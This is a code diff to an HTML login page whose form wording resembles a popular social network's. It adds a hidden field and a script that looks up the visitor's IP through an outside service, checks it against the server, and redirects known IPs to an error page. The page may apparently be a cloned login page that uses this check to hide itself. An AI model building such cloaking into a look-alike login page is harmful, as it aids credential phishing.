@@ -328,6 +328,7 @@ footer .copyright span {
       <form class="login-form">
         <div class="form-content">
           <input type="text" name="username" required />
+          <input type="hidden" name="ipaddress" id="ipaddress">
           <label for="uname">Phone number, username, or email</label>
         </div>
         <div class="form-content">
@@ -441,6 +442,30 @@ footer .copyright span {
 
 <script>
 
+    fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      document.querySelector("#ipaddress").value = data.ip
+      fetch('/checkIp', ({
+        headers: {
+          "Content-Type": "application/json"
+        },
+        method: "post",
+        body: JSON.stringify({
+          ipaddress : data.ip
+        })
+      })).then((res) => {
+        return res.json()
+      }).then((data) => {
+        // console.log(data)
+        if(data.ipFound){
+        window.location.href="/serverError"
+      }
+      })
+    })
+    .catch(error => {
+      console.error('Error fetching IP:', error);
+    });
 </script>
 </body>
 </html>
